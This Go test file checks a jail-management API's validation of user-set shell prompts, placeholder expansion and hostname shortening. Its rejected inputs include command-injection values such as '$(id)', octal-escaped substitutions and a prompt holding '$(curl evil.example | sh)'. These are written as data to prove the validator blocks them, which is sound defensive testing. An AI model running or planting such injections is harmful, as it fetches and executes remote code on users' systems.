package api

import (
	"strings"
	"testing"
)

func TestCheckPrompt(t *testing.T) {
	ok := []string{
		"default", "short", "none",
		`{jail}@{host} ({project}) \w \$ `, `\D{%H:%M} {jail}{host}{project} \$ `,
		`\u@\h:\w\$ `, `[\u@\h \W]\$ `, `\[\033[1;31m\]\h\[\033[0m\] \$ `, `\[\e]0;\u@\h\a\]\w\$ `,
		`\D{%H:%M:%S} \w \$ `, `\t \# \! \j \l \s \v \V \A \@ \T \d \H\n\r> `,
		`a;b|c&d>e<f"g()%*?~^ \$(not run)`, `→ \W ✓ `, `\33[0m\7\007`,
		strings.Repeat("x", MaxPromptLen),
	}
	for _, v := range ok {
		if err := CheckPrompt(v); err != nil {
			t.Errorf("CheckPrompt(%q): %v", v, err)
		}
	}
	bad := map[string]string{
		"":                                     "empty",
		"it's":                                 "single quote",
		"$(id)":                                "$",
		"${HOME}":                              "$",
		"$HOME":                                "$",
		"`id`":                                 "backquote",
		`\\\$(id)`:                             "literal backslash",
		`\\$(id)`:                              "literal backslash",
		`\044(id)`:                             "octal",
		`\140id\140`:                           "octal",
		`\134\$(id)`:                           "octal",
		`\047`:                                 "octal",
		"a\nb":                                 "control",
		"a\rb":                                 "control",
		"a\tb":                                 "control",
		"a\x1b[0m":                             "control",
		"a\x00":                                "control",
		"a\u00a0b":                             "non-printable",
		"a\u202eb":                             "non-printable",
		`\q`:                                   "not a prompt escape",
		`\x41`:                                 "not a prompt escape",
		`\`:                                    "lone backslash",
		`\D`:                                   "{format}",
		`\D{%H`:                                "not closed",
		`\D{$(id)}`:                            "format",
		`\D{a'b}`:                              "format",
		strings.Repeat("x", MaxPromptLen+1):    "bytes long",
		string([]byte{'a', 0xff}):              "UTF-8",
		"\u00e9" + strings.Repeat("x", 255):    "bytes long",
		`\u@\h:\w\$ $(curl evil.example | sh)`: "$",
	}
	for v, want := range bad {
		err := CheckPrompt(v)
		if err == nil {
			t.Errorf("CheckPrompt(%q) was accepted", v)
			continue
		}
		if !strings.Contains(err.Error(), want) {
			t.Errorf("CheckPrompt(%q) = %v, want a message about %q", v, err, want)
		}
	}
}

func TestShellKeys(t *testing.T) {
	var s JailSpec
	for in, want := range map[string]string{"bash": BashPath, "sh": ShPath, "/usr/local/bin/zsh": "/usr/local/bin/zsh"} {
		if _, err := ApplyConfig(&s, map[string]string{"shell": in}, nil); err != nil || s.Shell != want {
			t.Errorf("shell %s: %q %v", in, s.Shell, err)
		}
	}
	if _, err := ApplyConfig(&s, map[string]string{"shell": "zsh"}, nil); err == nil {
		t.Error("a relative shell name other than bash and sh was accepted")
	}
	if _, err := ApplyConfig(&s, map[string]string{"prompt": `\u \$ `}, nil); err != nil || s.Prompt != `\u \$ ` {
		t.Errorf("prompt: %q %v", s.Prompt, err)
	}
	if _, err := ApplyConfig(&s, map[string]string{"prompt": "$(id)"}, nil); err == nil || !IsCode(err, CodeInvalid) {
		t.Errorf("a prompt that runs a command: %v", err)
	}
	if _, err := ApplyConfig(&s, nil, []string{"prompt"}); err != nil || s.Prompt != "" {
		t.Errorf("unset prompt: %q %v", s.Prompt, err)
	}
	if EffectivePS1("default", 40) != DefaultPS1(40) || EffectivePS1("short", 40) != `\[\e[38;5;40m\]\u@\h\[\e[0m\]:\w\$ ` ||
		EffectivePS1("none", 40) != "" || EffectivePS1("", 40) != "" || EffectivePS1("x> ", 1) != "x> " {
		t.Error("EffectivePS1")
	}
	if CheckPromptColor(-1) == nil || CheckPromptColor(256) == nil || CheckPromptColor(0) != nil || CheckPromptColor(255) != nil {
		t.Error("CheckPromptColor")
	}
}

func TestPromptPlaceholders(t *testing.T) {
	for _, bad := range []string{"{", "}", "{x}", "{jail", "jail}", "{Jail}", "{ jail}", "{{jail}", "{jail}}", "${jail}", `\{jail}`, "{host}{"} {
		err := CheckPrompt(bad)
		if err == nil {
			t.Errorf("CheckPrompt(%q) was accepted", bad)
			continue
		}
		if !strings.Contains(err.Error(), "{jail}") || !strings.Contains(err.Error(), "{project}") || !strings.Contains(err.Error(), "{host}") {
			if bad != "${jail}" && bad != `\{jail}` {
				t.Errorf("CheckPrompt(%q) does not name the placeholders: %v", bad, err)
			}
		}
	}
	// the placeholders become references to the variables of the jail; the names are constants
	if got := ExpandPrompt(`\u@{jail} [{project}/{host}]\$ `); got != `\u@${JAILOPS_JAIL-} [${JAILOPS_PROJECT-}/${JAILOPS_HOST-}]\$ ` {
		t.Errorf("ExpandPrompt: %q", got)
	}
	if got := ExpandPrompt("no placeholders \\w "); got != "no placeholders \\w " {
		t.Errorf("no placeholders: %q", got)
	}
}

// What reaches the prompt file is the preset prompts and the text of a user with its placeholders turned into the three
// references; nothing a user types, and no value of a jail, can add anything else (CheckPS1).
func TestCheckPS1(t *testing.T) {
	for _, ok := range []string{DefaultPS1(39), ShortPS1(255), ExpandPrompt(`{jail}.{project}.{host}> `), ExpandPrompt(`\D{%H:%M} \w \$ `), `\u@\h:\w\$ `} {
		if err := CheckPS1(ok); err != nil {
			t.Errorf("CheckPS1(%q): %v", ok, err)
		}
	}
	for _, bad := range []string{"", "{jail}", "{project}x", "${HOME}", "$(id)", "`id`", "it's", "${JAILOPS_X-}", "${JAILOPS_JAIL}", "${JAILOPS_JAIL-}$(id)",
		"{${JAILOPS_JAIL-}jail}", "${_jailops_where:+ x}", "${" + Where + "}"} {
		if CheckPS1(bad) == nil {
			t.Errorf("CheckPS1(%q) was accepted", bad)
		}
	}
	// what a user types never comes out holding a variable reference or a $ of its own
	for _, in := range []string{"{jail}", `a{host}b\$ `, `\u@\h `} {
		if CheckPrompt(in) != nil {
			continue
		}
		if out := ExpandPrompt(in); strings.Count(out, "$") != strings.Count(in, `\$`)+strings.Count(in, "{") {
			t.Errorf("%q expands to %q", in, out)
		}
	}
}

func TestWhereLine(t *testing.T) {
	if got := WhereLine(); got != `_jailops_where="${JAILOPS_PROJECT-}${JAILOPS_PROJECT:+${JAILOPS_HOST:+/}}${JAILOPS_HOST-}"` {
		t.Errorf("WhereLine: %q", got)
	}
}

func TestShortHost(t *testing.T) {
	for in, want := range map[string]string{
		"babel": "babel", "Babel.Example.ORG": "babel", "  node-1.lan ": "node-1", "": "", ".example.org": "",
		"a_b": "ab", "-x-": "x", "é": "", "node1.": "node1",
	} {
		if got := ShortHost(in); got != want {
			t.Errorf("ShortHost(%q) = %q, want %q", in, got, want)
		}
	}
}
